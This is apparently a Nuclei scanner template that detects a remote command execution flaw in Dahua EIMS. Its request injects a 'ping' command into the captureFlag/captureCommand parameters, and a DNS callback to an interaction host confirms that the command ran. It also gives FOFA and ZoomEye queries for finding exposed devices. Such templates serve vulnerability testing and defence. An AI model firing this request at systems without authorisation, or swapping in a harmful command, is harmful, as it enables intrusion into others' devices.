http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - regex:
    - ^success$
    type: regex
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{interactsh-url}}%20index.pcap'
id: dahua-eims-rce
info:
  author: DhiyaneshDk
  description: 'Dahua EIMS capture_handle interface allows remote command execution.

    '
  metadata:
    fofa-query: <title>eims</title>
    max-request: 1
    verified: true
    zoomeye-query: "app:\"\u5927\u534E EIMS\""
  name: Dahua EIMS - Remote Command Execution
  reference:
  - https://github.com/wy876/POC/blob/main/%E5%A4%A7%E5%8D%8EEIMS-capture_handle%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  - https://cn-sec.com/archives/2554372.html
  severity: critical
  tags: dahua,rce,eims
